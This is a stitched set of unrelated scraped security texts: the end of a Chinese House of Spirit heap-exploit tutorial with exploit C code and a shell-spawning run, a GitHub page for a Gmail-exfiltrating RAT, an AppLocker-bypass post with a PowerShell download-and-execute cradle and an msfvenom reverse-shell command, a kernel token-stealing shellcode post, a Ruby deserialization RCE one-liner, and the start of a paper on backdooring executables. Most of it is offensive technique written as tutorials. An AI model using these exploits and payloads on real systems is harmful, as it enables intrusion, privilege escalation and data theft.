argv1, NULL };\n\n        strcpy(argv1,scode);\n\n        \/* Overwrite ptr1 in vuln with stack address - 0xbffffdf0. Overwrite local_age in vuln with chunk size - 0x30 *\/\n        strcpy(argv1+48,\"\\xf0\\xfd\\xff\\xbf\\x30\"); \n\n        argv[53] = '';\n\n        \/* Execution of the vulnerable program *\/\n        execve( argv[0], argv, NULL );\n        return( -1 );\n}\n```\n\n\u4e0a\u8ff0\u7a0b\u5e8f\u5728\u653b\u51fb\u8005\u53c2\u6570\u4e0b\u7684\u6808\u7684\u5e03\u5c40\n\n\n![house-of-spirit](..\/media\/pic\/heap\/house-of-spirit-after-attack.png)\n\n\u968f\u7740\u653b\u51fb\u53c2\u6570\u8ba9\u6211\u4eec\u770b\u4e00\u4e0b\u8fd4\u56de\u5730\u5740\u662f\u5982\u4f55\u88ab\u8986\u76d6\u7684\uff1a\n\nLine[3]: \u7f13\u51b2\u533a\u6ea2\u51fa\n\n\u8fd9\u91cc\u653b\u51fb\u8005\u8f93\u5165 argv[1] \u88ab\u590d\u5236\u5230\u540d\u4e3a name \u7684\u7f13\u51b2\u533a\u91cc\u9762\u3002\n\n\u56e0\u4e3a\u653b\u51fb\u8005\u8f93\u5165\u7684\u6570\u636e\u5927\u4e8e 44\uff0c\u53d8\u91cf\u7684 ptr1 \u548c local_age \u5206\u522b\u88ab\u6808\u5730\u5740\u548c chunk size \u8986\u76d6\u3002\n\n\u6808\u5730\u5740 - 0xbffffdf0 - \u653b\u51fb\u8005\u620f\u5f04 glibc malloc \u8fd4\u56de\u8fd9\u4e2a\u5730\u5740\u5f53 line[5]\u88ab\u6267\u884c\u65f6\u3002\n\nchunk size - 0x30 \u8fd9\u4e2a chunk size \u88ab\u7528\u6765\u5f53 line[4]\u88ab\u6267\u884c\u65f6\u620f\u5f04 glibc malloc\u3002\n\nLine[4]: \u628a\u6808\u533a\u57df\u52a0\u5230 glibc malloc \u7684 fast bin\u3002\n\nfree() \u8c03\u7528 _int_free(). \u73b0\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u540e  ptr1 = 0xbffffdf0 (\u800c\u4e0d\u662f 0x804aa08). \n\n\u4ee5 free()\u7684\u4e00\u4e2a\u53c2\u6570\u8986\u76d6 ptr1 \n\nOverwritten ptr1 is passed as an argument to free(). \n\n\u8fd9\u6b3a\u9a97 glibc malloc \u6765 free \u4e00\u4e2a\u4f4d\u4e8e\u6808\u7a7a\u95f4\u7684\u5185\u5b58\u533a\u57df\u3002\n\n\u8fd9\u4e2a\u6808\u533a\u57df\u7684 size \u4f1a\u83b7\u91ca\u653e\uff0c\u653b\u51fb\u8005\u4f1a\u7528 0x30 \u8986\u76d6\u4f4d\u4e8e ptr1-8+4\n\n\u56e0\u6b64`glibc malloc`\u5bf9\u5f85\u8fd9\u4e2a chunk \u5c31\u50cf fast chunk \u4e00\u6837(\u56e0\u4e3a 48 < 64)\uff0c\u611f\u5174\u8da3\u7684 free \u72b6\u6001\u7684 chunk \u4f4d\u4e8e \u7d22\u5f15 4 \u7684 fastbinlist \u7684\u524d\u7aef\u3002.\n\nLine[5]: \u6062\u590d\u6808\u533a\u57df(\u88ab\u6dfb\u52a0\u5728 line[4])\n\n\u5bf9 malloc \u7684 40 \u5b57\u8282\u8bf7\u6c42\u4f1a\u88ab`checked_request2size()`\u8f6c\u5316\u4e3a 48 \u5b57\u8282\u3002\n\n\u56e0\u4e3a\u53ef\u7528 size 48 \u662f\u5c5e\u4e8e fast chunk \u7684\uff0c\u5b83\u7684\u5bf9\u5e94\u7684 fast binlist(\u4f4d\u4e8e 4 \u53f7\u7d22\u5f15)\u88ab\u6062\u590d\u3002\n\nfast bins \u7684\u7b2c\u4e00\u4e2a chunk \u88ab\u79fb\u9664\u5e76\u8fd4\u56de\u7ed9\u7528\u6237\u3002\n\n\u7b2c\u4e00\u4e2a chunk \u65e0\u6240\u8c13\uff0c\u4f46\u662f\u6808\u533a\u57df\u5728 line[4]\u6267\u884c\u671f\u95f4\u88ab\u589e\u52a0\u4e86\u3002\n\nLine[6]: \u8986\u76d6\u8fd4\u56de\u5730\u5740\n\n\u590d\u5236\u653b\u51fb\u53c2\u6570 argv[1] \u5230\u4f4d\u7f6e\u5f00\u59cb\u4e8e 0xbffffdf0 \u7684\u6808\u533a\u57df(glibc malloc \u8fd4\u56de\u7684)\u3002\n\nargv[1]\u524d 16 \u5b57\u8282\u662f\n\\xeb\\x0e \u2013 14 \u5b57\u8282\u8f6c\u8df3\n\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41 \u2013 \u586b\u5145\n\\xb8\\xfd\\xff\\xbf \u2013 \u7528\u8fd9\u4e2a\u503c\u8986\u76d6\u5b58\u50a8\u5728 stack \u4e0a\u7684\u8fd4\u56de\u5730\u5740\u3002\n\n\u56e0\u6b64\u5f53 fvuln \u88ab\u6267\u884c\uff0ceip \u5c06\u4f1a\u662f 0xbffffdb8 - \u8fd9\u4e2a\u4f4d\u7f6e\u5305\u542b\u8f6c\u8df3\u6307\u4ee4\u63a5\u7740 shellcode \u4f1a spwan \u4e00\u4e2a shell\uff01\n\n```shell\nSn0rt@warzone:~$ gcc -g -fno-stack-protector -z norelro -z execstack -o vuln vuln.c -Wl,--rpath=~\/workspace\/glibc\/glibc-inst2.20\/lib -Wl,--dynamic-linker=~\/workspace\/glibc\/glibc-inst2.20\/lib\/ld-linux.so.2\nSn0rt@warzone:~$ gcc -g -o exp exp.c\nSn0rt@warzone:~$ .\/exp \n\nPTR1 = [ 0x804a008 ]\nPTR1 = [ 0xbffffdf0 ]\n\nAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd1\ufffdPh\/\/shh\/bin\ufffd\ufffdP\ufffd\ufffdS\ufffd\n$ ls\ncmd  exp  exp.c  print\tvuln  vuln.c\n$ exit\n```\n\n\u4fdd\u62a4: \u76ee\u524d\u4e3a\u6b62\u8fd8\u6ca1\u6709\u589e\u52a0\u4fdd\u62a4\u6280\u672f\uff0c\u4e5f\u5c31\u8bf4\u8fd9\u4e2a\u6280\u672f\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5728\u6700\u65b0\u7248\u672c\u7684 glibc \u4e0a\u5229\u7528\u5806\u6ea2\u51fa\u3002\n\n# House of Prime\n\nWIP\n\n# House of Lore\n\nWIP\n\n\n### reference\n\n[^sploitfun]: [sploitfun](https:\/\/sploitfun.wordpress.com\/2015\/03\/04\/heap-overflow-using-malloc-maleficarum\/)\n"}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]Viralmaniar \/ [31]Powershell-RAT Public\n* [32]Notifications\n* [33]Fork 249\n* [34]Star 967 (BUTTON)\n*\nPython based backdoor that uses Gmail to exfiltrate data through\nattachment. This RAT will help during red team engagements to backdoor\nany Windows machines. It tracks the user activity using screen capture\nand sends it to an attacker as an e-mail attachment.\n[35]github.com\/viralmaniar\/powershell-rat\n[36]967 stars [37]249 forks [38]Branches [39]Tags [40]Activity\n[41]Star (BUTTON)\n[42]Notifications\n* [43]Code\n* [44]Issues 7\n* [45]Pull requests 0\n* [46]Actions\n* [47]Projects 0\n* [48]Security\n* [49]Insights\n(BUTTON) Additional navigation options\n* [50]Code\n* [51]Issues\n* [52]Pull requests\n* [53]Actions\n* [54]Projects\n* [55]Security\n* [56]Insights\nViralmaniar\/Powershell-RAT\nThis commit does not belong to any branch on this repository, and may\nbelong to a fork outside of the repository.\nAbout\nPython based backdoor that uses Gmail to exfiltrate data through\nattachment. This RAT will help during red team engagements to backdoor\nany Windows machines. It tracks the user activity using screen capture\nand sends it to an attacker as an e-mail attachment.\n[57]github.com\/Viralmaniar\/Powershell-RAT\nTopics\n[58]remoteaccess [59]backdoor [60]powershell [61]hacking [62]trojan\n[63]penetration-testing [64]rat [65]pentesting [66]hacking-tool [67]fud\n[68]redteaming [69]trojan-rat\nResources\n[70]Readme\n[71]Activity\nStars\n[72]967 stars\nWatchers\n[73]56 watching\nForks\n[74]249 forks\n[75]Report repository\n[76]Releases 1\nPowershell-Rat v0.1 Latest\nMar 20, 2019\n[77]Packages 0\nNo packages published\nLanguages\n* [78]Python 57.7%\n* [79]PowerShell 31.8%\n* [80]Visual Basic .NET 5.4%\n* [81]Batchfile 5.1%\nFooter\n\u00a9 2024 GitHub, Inc.\nFooter navigation\n* [82]Terms\n* [83]Privacy\n* [84]Security\n* [85]Status\n* [86]Docs\n* [87]Contact\n* (BUTTON) Manage cookies\n* (BUTTON) Do not share my personal information\n(BUTTON) You can\u2019t perform that action at this time.\n(BUTTON)"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb AppLocker Bypass \u2013 Rundll32\nComments Feed [4]alternate [5]alternate [6]Penetration Testing Lab\n[7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]May 23, 2017May 21, 2017\nAppLocker Bypass \u2013 Rundll32\nby [28]Administrator.In [29]Defense Evasion.[30]4 Comments on AppLocker\nBypass \u2013 Rundll32\nRundll32 is a Microsoft binary that can execute code that is inside a\nDLL file. Since this utility is part of the Windows operating system it\ncan be used as a method in order to bypass AppLocker rules or Software\nRestriction Policies. So if the environment is not properly lockdown\nand users are permitted to use this binary then they can write their\nown DLL\u2019s and bypass any restrictions or execute malicious JavaScript\ncode.\nRundll32 \u2013 JavaScript\nIt possible to utilize the rundll32 binary in order to execute\nJavaScript code that has an embedded payload and it hosted on a\nwebserver. The Metasploit module web delivery can quickly create a\nwebserver that will serve a specific payload (Python, PHP or\nPowerShell). In this case the payload will be PowerShell.\nexploit\/multi\/script\/web_delivery\nWeb Delivery Module Configuration Web Delivery Module Configuration\nThe following command needs to be executed from the command prompt. If\nthe command prompt is locked then the method that is described below\ncan be used to unlock the cmd.\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20\nActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c IEX (New-Obj\nect Net.WebClient).DownloadString('http:\/\/ip:port\/');\"\nRundll32 - JavaScript Rundll32 \u2013 JavaScript\nRundll32 will execute the arbitrary code and it will return a\nMeterpreter session. The main benefit of this is that since it will not\ntouch the disk the AppLocker rule will bypassed. However PowerShell\nshould be allowed to run on the system.\nWeb Delivery Payload Web Delivery Payload\nRundll32 \u2013 Meterpreter\nThe Metasploit Msfvenom can be used in order to create a custom DLL\nthat will contain a meterpreter payload:\nmsfvenom -p windows\/meterpreter\/reverse_tcp LHOST=192.168.100.3 LPORT=44444 -f d\nll -o pentestlab.dll\nMsfvenom - DLL Generation Msfvenom DLL Generation\nThe utility rundll32 can then load and execute the payload that is\ninside the pentestlab.dll.\nrundll32 shell32.dll,Control_RunDLL C:\\Users\\pentestlab.dll\nRundll32 - Injecting DLL into a Process AppLocker Bypass \u2013 Rundll32 via\nDLL\nA meterpreter session will be opened.\nRundll32 - Meterpreter Rundll32 \u2013 Meterpreter\nCommand Prompt\nIn Windows systems that have locked the command prompt via an AppLocker\nrule it is possible to bypass this restriction by injecting a malicious\nDLL file into a legitimate process. [31]Didier Stevens has released a\nmodified version of [32]cmd in the form of a DLL file by using an open\nsource variant obtained from the ReactOS.\nAppLocker - Command Prompt Blocked AppLocker \u2013 Command Prompt Blocked\nSince the rundll32 is a trusted Microsoft utility it can be used to\nload the cmd.dll into a process, execute the code on the DLL and\ntherefore bypass the AppLocker rule and open the command prompt. The\nfollowing two commands can be executed from the Windows Run:\nrundll32 C:\\cmd.dll,EntryPoint\nrundll32 shell32.dll,Control_RunDLL C:\\cmd.dll\nRundll32 - DLL Loading Entry Point Rundll32 \u2013 DLL Loading Entry\nPointRundll32 - DLL Loading Control Run Rundll32 \u2013 DLL Loading Control\nRun\nThe code will be executed through rundll32 and the command prompt will\nbe opened.\nRundll32 - Command Prompt Rundll32 \u2013 Command Prompt\nRegistry\nThe same technique can be applied in systems where the registry is\nlocked. Didier Stevens released also a modified version of [33]registry\neditor in the form of a DLL like the command prompt above.\nAppLocker - Registry Blocked AppLocker \u2013 Registry Blocked\nThe following commands can load and run the regedit.dll via rundll32\nand therefore bypass the AppLocker rule.\nrundll32 C:\\regedit.dll,EntryPoint\nrundll32 shell32.dll,Control_RunDLL C:\\regedit.dll\nAppLocker - Rundll32 Registry AppLocker \u2013 Rundll32 RegistryAppLocker -\nRegistry Unlocked AppLocker \u2013 Registry UnlockedAppLocker - Rundll32\nRegistry Unlocked AppLocker \u2013 Rundll32 Registry Unlocked\nResources\n[34]https:\/\/blog.didierstevens.com\/?s=cmd\n[35]http:\/\/didierstevens.com\/files\/software\/cmd-dll_v0_0_4.zip\n[36]http:\/\/www.didierstevens.com\/files\/software\/regedit-dll_v0_0_1.zip\n[37]https:\/\/github.com\/fdiskyou\/PSShell\n[38]http:\/\/ikat.ha.cked.net\/\nRate this:\nShare this:\n* [39]Twitter\n* [40]Facebook\n* [41]LinkedIn\n* [42]Reddit\n* [43]Tumblr\n* [44]WhatsApp\n* [45]Telegram\n* [46]Pinterest\n* [47]Pocket\n* [48]Email\n*\nLike Loading...\nRelated\n[49]AppLocker[50]Command Prompt[51]Metasploit[52]Registry[53]Rundll32\n4 Comments\n1. Pingback: [54]AppLocker Bypass \u2013 Rundll32 \u2013 jtlr.net\n2.\nm says:\n[55]May 24, 2017 at 3:32 pm\nthis command return access denied in cmd window\n[56]Reply\n1.\n[57]netbiosX says:\n[58]May 24, 2017 at 5:32 pm\nThen runDLL32 is blocked!\n[59]Reply\n3. Pingback: [60]A Deep Dive Into RUNDLL32.EXE \u2014 MOV AX, BX\nLeave a Reply [61]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nPost navigation\n[62]Previous Previous post: AppLocker Bypass \u2013 Weak Path Rules\n[63]Next Next post: AppLocker Bypass \u2013 Control Panel\nFollow PenTest Lab\nEnter your email address to follow this blog and receive notifications\nof new articles by email.\nEmail Address: ____________________\n(BUTTON) Follow\nJoin 2,591 other subscribers\nSearch Topic\n____________________ (BUTTON) Search\nRecent Posts\n* [64]Persistence \u2013 Event Log\n* [65]Initial Access \u2013 search-ms URI Handler\n* [66]Persistence \u2013 Scheduled Task Tampering\n* [67]Persistence \u2013 Windows Telemetry\n* [68]Persistence \u2013 Service Control Manager\nCategories\n* [69]Coding (10)\n* [70]Exploitation Techniques (19)\n* [71]External Submissions (3)\n* [72]General Lab Notes (22)\n* [73]Information Gathering (12)\n* [74]Infrastructure (2)\n* [75]Maintaining Access (4)\n* [76]Mobile Pentesting (7)\n* [77]Network Mapping (1)\n* [78]Post Exploitation (13)\n* [79]Red Team (123)\n+ [80]Credential Access (3)\n+ [81]Defense Evasion (22)\n+ [82]Domain Escalation (5)\n+ [83]Domain Persistence (4)\n+ [84]Initial Access (1)\n+ [85]Lateral Movement (2)\n+ [86]Man-in-the-middle (1)\n+ [87]Persistence (34)\n+ [88]Privilege Escalation (17)\n* [89]Reviews (1)\n* [90]Social Engineering (11)\n* [91]Tools (7)\n* [92]VoIP (4)\n* [93]Web Application (14)\n* [94]Wireless (2)\nPentest Laboratories Discord\n* [95]Discord\nPen Test Lab Stats\n* 7,183,938 hits\n[96]Facebook Page\n[97]Facebook Page\n__________________________________________________________________\n[98]Blog at WordPress.com.\n* [99]Methodologies\n+ [100]Red Teaming\no [101]Persistence\n* [102]Resources\n+ [103]Papers\no [104]Web Application\n+ [105]Presentations\no [106]Defcon\no [107]DerbyCon\no [108]Tools\n+ [109]Videos\no [110]BSides\no [111]Defcon\no [112]DerbyCon\no [113]Hack In Paris\n* [114]Contact\n+ [115]About Us\n* [116]Comment\n* [117]Reblog\n* [118]Subscribe [119]Subscribed\n+ [120]Penetration Testing Lab\nJoin 2,289 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [121]Log in now.\n*\n+ [122]Penetration Testing Lab\n+ [123]Customize\n+ [124]Subscribe [125]Subscribed\n+ [126]Sign up\n+ [127]Log in\n+ [128]Copy shortlink\n+ [129]Report this content\n+ [130]View post in Reader\n+ [131]Manage subscriptions\n+ [132]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [133]likes-master\n%d"}
{"text":"#[1]RSS Feed\n[2]Home\nBLOGS\n[3]TECH BLOG\n[4]CYBER BLOG\n[5]Improsec | improving security\n[6]Home\nBLOGS\n[7]TECH BLOG\n[8]CYBER BLOG\nWindows Kernel Shellcode on Windows 10 \u2013 Part 1\nFebruary 27, 2017\n[9]IT-sikkerhed\n[10]Morten Schenk\nWindows Kernel Shellcode on Windows 10 \u2013 Part 1\n[11]Morten Schenk\n[12]February 27, 2017\n[13]IT-sikkerhed\n[14]Windows Kernel Shellcode on Windows 10 \u2013 Part 1\n[15]Morten Schenk\n[16]February 27, 2017\n[17]IT-sikkerhed\nWhen creating Windows kernel exploits the goal is often to somehow gain\nhigher privileges, often SYSTEM. This part of the exploit writing is\nnormally the very last part, and often not very discussed since so many\nsteps come before it. The most common ways I\u2019ve seen that done are\neither by stealing a process token of a privileged process or by\nremoving the ACL of a privileged process. In essence, the techniques I\nnormally come across and use myself are derived and often referenced\nfrom the Black Hat presentation by [18]Cesar Cerrudo in 2012. It is a\ngreat presentation and white paper and should definitely be read. There\nare however two issues when trying to use the methods from the white\npaper; firstly, it does not supply the actual shellcode only the\ntechnique in theory and secondly, it was written prior to the release\nof Windows 8.1 much less Windows 10.\nSince this is an area that is often not given much attention, I wanted\nto explore it in-depth and discover whether the three methods described\nby Cesar Cerrudo still work on Windows 10 Anniversary Edition.\nFurthermore, I wanted to develop the actual shellcode to run for each\nof them and document any changes which might be needed for each of them\non Windows 10.\nTo recap the highlight of the whitepaper, Cesar describes three\nmethods:\n-          Replacing process token.\n-          Nulling out ACLs.\n-          Enabling privileges.\nIn this blog post I will explore how to replace the process token and\ngain SYSTEM privileges, the other two methods will be explored in\nupcoming blog posts.\nReplacing the process token is one of the two methods I see most often,\nas Cesar explains the idea is to find a privileged process and copy the\ntoken of that process to the current process. There are a lot of\ndangers of causing a bug check with this method if any privileged\nprocess is chosen, hence the system process is normally used since the\nreference counter on that is so high it most likely will not cause any\nproblems. The method described in the whitepaper is still valid if the\nexploited process is not running in a sandbox, which is sadly often the\ncase. Because of this some changes need to be made, the main idea is\nstill valid, however.\nTo iterate the idea is as follows:\n-          Find the EPROCESS address of the current process.\n-          Find the EPROCESS address of the SYSTEM process.\n-          Copy token of SYSTEM process to the current process.\n-          Perform actions requiring SYSTEM privileges.\nSince I most often develop my kernel exploits for proof of concept and\nnot weaponization I compile them to EXE\u2019s and launch them directly from\ncmd.exe on the target instead of through the browser. I still like to\nmake sure they would work from Low Integrity or AppContainer however.\nBut since the exploit normally exits after performing its duties I\nwould like the cmd.exe process to gain the elevated rights instead of\nthe process the actual exploits runs in.\nThe following assumes that the exploit as gained arbitrary kernel mode\ncode execution and we can handcraft the assembly code to run. Although\nthis might sound unlikely to some, it isn\u2019t. Even on the upcoming\nCreators Edition of Windows 10, there are multiple ways to achieve this\nif a write-what-where vulnerability is found. I hope to be able to\npresent several new techniques at Black Hat USA myself.\nThe Shellcode\nWith all of the preconditions out of the way, let us tackle the four\nproblems listed earlier. First, we need to locate the EPROCESS of the\ncurrent process, we can do this by first finding the KTHREAD of the\nprocess since this is located at offset 0x188 in the GS segment. Then\nwe can find a pointer to the KPROCESS at offset 0x220 of the KTHREAD as\nshown below:\nWhich means the address of the EPROCESS for the current process may be\nfound through the following assembly instructions:\nSince I like to transfer the permissions to cmd.exe an additional step\nactually arises, finding the EPROCESS of cmd.exe. To do this we use the\nprocess ID, since it is the parent process of the exploit application\nit can be found through:\nWhich means that offset 0x3EO in the current process\u2019 EPROCESS is the\nPID of cmd.exe, this is captured through:\nNow to find the EPROCESS address of another process we notice the\nfollowing structure:\nThis means that the PID of the process is at offset 0x2E8 of the\nEPROCESS and that at offset 0x2F0 we have a linked list of all the\nEPROCESS\u2019s, it is then possible to loop though them looking for the PID\nof cmd.exe:\nOnce this is done we want to find the address of the token, since this\nis what we want to replace. It is located at offset 0x358 as seen\nbelow:\nSo, we make sure to store that address before going onwards:\nNow we have found the EPROCESS of cmd.exe, the process we want to gain\nSYSTEM privileges. Now we need to find the EPROCESS of the System\nprocess. Since the System process always has a PID of 4 we can find it\nin the same way:\nThis gives us the address of the EPROCESS for the System process. The\nnext step is to replace the token of the cmd.exe process. This is\nsimply done by overwriting the existing token:\nRemembering that RDX contains offset 0x358 of the EPROCESS address of\nthe System process and RCX contains offset 0x358 of the EPROCESS\naddress of cmd.exe. Executing the actual shellcode looks like:\nWith the expected result:\nThis shellcode is 100% stable and grants the parent process, or if\nmodified the executing process, SYSTEM privileges. That concludes the\nfirst blog post, the shellcode may be found at the following\nGithub:  [19]https:\/\/github.com\/MortenSchenk\/Token-Stealing-Shellcode\nNewer Post[20]Windows Kernel Shellcode on Windows 10 \u2013 Part 2\nOlder Post[21]Bagd\u00f8re og datakompromittering via backupsystemer\nGet in touch Today for a safer Tomorrow\u2026\n[22]Contact Improsec\n[23]Back to Top\nImprosec A\/S \u2022 Amagerf\u00e6lledvej 106, 3. \u2022 2300 Copenhagen S \u2022 Telefon:\n(+45) 5357 5337 \u2022 E-mail: [24][email protected]"}
{"text":"# Ruby Deserialization\n\nScript to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5\n\n```ruby\nfor i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done\n```\n\n## References\n\n- [RUBY 2.X UNIVERSAL RCE DESERIALIZATION GADGET CHAIN - elttam, Luke Jahnke](https:\/\/www.elttam.com.au\/blog\/ruby-deserialization\/)\n- [Online access to Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab](https:\/\/pentesterlab.com\/exercises\/ruby_ugadget\/online)"}
{"text":"Introduction to Manual Backdooring\nBy: @abatchy17\nhttp:\/\/www.abatchy.com\n\fPage | 2\nContents\nChapter 1: Introduction ............................................................................................................................... 3\nWhat is backdooring? ...................................................................................................................................3\nLab Environment ...........................................................................................................................................4\nQuick Peek into PE Structure........................................................................................................................5\nCode Caves ....................................................................................................................................................7\nAddress Space Layout Randomization (ASLR)..............................................................................................8\nFile Offsets and RVA......................................................................................................................................9\nChapter 2: Manual Backdooring................................................................................................................. 10\nManipulating Execution Flow .....................................................................................................................10\nClassic Backdooring.....................................................................................................................................12\nChapter 3: Hijacking Existing Code Caves................................................................................................... 19\nChapter 4: The Human Factor.................................................................................................................... 23\nMore Anti-Virus Bypassing Shenanigans....................................................................................................26\nHow do I protect myself?............................................................................................................................27\nAppendix.................................................................................................................................................... 28\nEquations.....................................................................................................................................................28\nRepositories.................................................................................................................................................28\nAcknowledgements.................................................................................................................................... 29\nReferences................................................................................................................................................. 30\n\fPage | 3\nChapter 1: Introduction\nDISCLAIMER: This research is strictly for educational purposes. Use at your own risk.\nWhat is backdooring?\nIn the context of this paper backdooring means making seemingly harmless executables (Portable Executables or\nPEs in this paper) execute malicious payloads. That payload could be anything from launching calc.exe to adding a\nuser account to spawning a remote shell. Any self-sufficient payload, aka shellcode.\nAlthough bypassing anti-virus software is not the main focus, an iterative analysis will be made to demonstrate\nthe efficacy of the backdooring technique. This topic is covered several times already, but none focused on\ndealing with ASLR, not does using existing code caves which this paper does cover.\nOne excellent tool that automates backdooring a whole spectrum of executables is The Backdoor Factory by Josh\nPitts. I'd like to thank him for helping me explain some parts. Yet, don't rely on it yet, knowing how you can\nimplement backdoors manually won't hurt. ;)\nWhy would you backdoor stuff though? Are you evil?\nMaybe. No! Did you even read the disclaimer?\nDo you like it in the backdoor?\n\u2026\nOkay okay, what's a good target for backdooring?\nSince the executable will ultimately create a reverse\/bind shell, user shouldn't get suspicious when network traffic\nis generated or when asked to add a firewall exception. Great targets are NetCat, SSH\/Telnet clients and many\nothers.\nAnother usage would be cracking software, there's that game you want to play without paying so you download a\n\"cracked\" version with a patched .exe. Because they must've only patched it not to require paying, without any\nother changes, right?\nPsExec (part of Sysinternal tools) will be used for our backdooring tutorial. PsExec is our tool for a number of\nreasons; it's widely used by sysadmins, already expected to generate network traffic, and communicates with\nother machines. Its intended purpose is already to load and execute binaries which makes it less suspicious when\ncreating a bind\/reverse shell. Funnily enough, Sophos AV flags PsExec as malware (WTF?), so its result won't be\ncounted in our analysis.\nHow is this paper organized?\nThis paper is divided into four chapters:\nChapter 1: An introduction (you're reading it now) as well as a lab setup (you won't just be reading, will you?), a\nbrief look into PE structure, code caves, ASLR and addressing.\n\fPage | 4\nChapter 2: Focuses on manually backdooring a legitimate PE the old fashioned way by adding an entire new\nsection.\nChapter 3: We'll be making use of existing code caves instead of adding a new section.\nChapter 4: Fourth module demonstrates a smarter way to prevent execution of the payload by default (adding a\nhuman factor).\nWhat prerequisites are needed to follow this paper?\nI'm learning about all of this myself, so that probably means not much. But to follow all parts and\/or to recreate\nthe implementations, you're expected to have good knowledge of x86 assembly, shellcoding, debuggers\n(specifically OllyDbg\/Immunity) and persistence.\nOne last thing, are you a llama or an alpaca?\nYes.\nLab Environment\nTo protect our system, virtual machines will be used for manipulation and executing the payloads. Reader can use\nwhatever setup\/tools they like, list below shows the specific OS versions and tools used throughout the paper.\nVirtual Machine 1: Windows 7 SP1 (x86)\nImmunity Debugger (http:\/\/debugger.immunityinc.com\/ID_register.py)\nLordPE (http:\/\/www.malware-analyzer.com\/pe-tools)\nXVI32 (http:\/\/www.chmaas.handshake.de\/delphi\/freeware\/xvi32\/xvi32.htm)\nStud_PE (http:\/\/www.cgsoftlabs.ro\/dl.html)\nNetcat (Can be found in Kali \/usr\/share\/windows-binaries\/)\nPsExec (https:\/\/technet.microsoft.com\/en-ca\/sysinternals\/bb897553.aspx)\nVirtual Machine 2: Kali Linux (Used 2016.2 32-bit but should work for any version)\n\u2022 All tools needed are pre-installed.\n\fPage | 5\nQuick Peek into PE Structure\nThis chapter will focus on specific parts of Portable Executables that are needed for the backdooring concepts\ndiscussed later. For a more in-depth explanation, check this, but for now we'll focus on what matters for the\nbackdooring process.\nLet's use our Windows 7 VM, load PsExec.exe in LordPE, you should see this:\n\u2022 EntryPoint: Virtual offset from base address that points to the first command to be executed\n(ModuleEntryPoint).\n\u2022 ImageBase: Preferred base address to map the executable to, although default value is 0x00400000, this\nvalue can be overridden. Ignored if compiled with ASLR.\n\u2022 SectionAlignment: Alignment of the sections when loaded in memory, cannot be less than page size (4096\nbytes). Sections have to occupy space of multiples of SectionAlignment in memory.\n\u2022 FileAlignment: Alignment of the sections in the raw file, usually 512.\n\u2022 Magic: Slightly overhyped term for File Signature (Sorry, nothing magical here).\n\u2022 NumberOfSections: Number of sections defined after header, discussed later.\n\u2022 SizeOfHeaders: Combined size of all headers (including DOS header, PE header, PE optional header and\nsection headers).\n\u2022 Checksum: The image file checksum.\n\u2022 SizeOfOptionalHeader: As it says. Optional header contains data like preferred 